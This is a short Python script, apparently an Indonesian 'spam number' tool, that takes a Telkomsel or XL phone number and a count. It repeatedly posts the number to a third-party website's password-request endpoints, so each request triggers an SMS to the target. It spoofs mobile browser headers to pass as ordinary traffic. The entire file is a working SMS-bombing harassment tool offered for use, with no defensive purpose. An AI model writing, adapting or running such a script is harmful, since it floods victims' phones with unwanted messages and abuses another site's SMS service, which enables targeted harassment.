#Do not recode
#Code simple
#Author by Nubzbie
#Cek My Yt Nubzbie nation
#12-07-2020

import requests as r
import json, sys
from requests import post

def main():
  pil = sys.argv[1]
  if pil == "tsel":
    tsel()
  elif pil == "xl":
    xl()
  else:
    print ("Contoh : python spamno.py tsel/xl 628**** jumlah")
  



def tsel():
  no = sys.argv[2]
  jumlah = int(sys.argv[3])
  url  = ('https://www.readyssh.net/tembak/tembaktsel/getpassworddd.php')
  data={'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36',
      'x-requested-with':'XMLHttpRequest',
      'Referer':'https://www.readyssh.net/paket-internet-murah/bima-tri',}
      
  datain={'msisdn':no}
  for x in range(jumlah):
    fck = r.post(url,data=datain,headers=data).text
    fucek = (fck).replace("Password dikirim ke "+no,"").replace("Coba ulangi lagi ya!","")
    print (fucek)
def xl():
  no = sys.argv[2]
  jumlah = int(sys.argv[3])
  url  = ('https://www.readyssh.net/tembak/tembakxlbiasa/getpassword.php')
  data={'user-agent':'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36',
      'x-requested-with':'XMLHttpRequest',
      'Referer':'https://www.readyssh.net/paket-internet-murah/bima-tri',}
      
  datain={'msisdn':no}
  for x in range(jumlah):
    fck = r.post(url,data=datain,headers=data).text
    fucek = (fck).replace("Password dikirim ke "+no,"").replace("Coba ulangi lagi ya!","")
    print (fucek)

main()
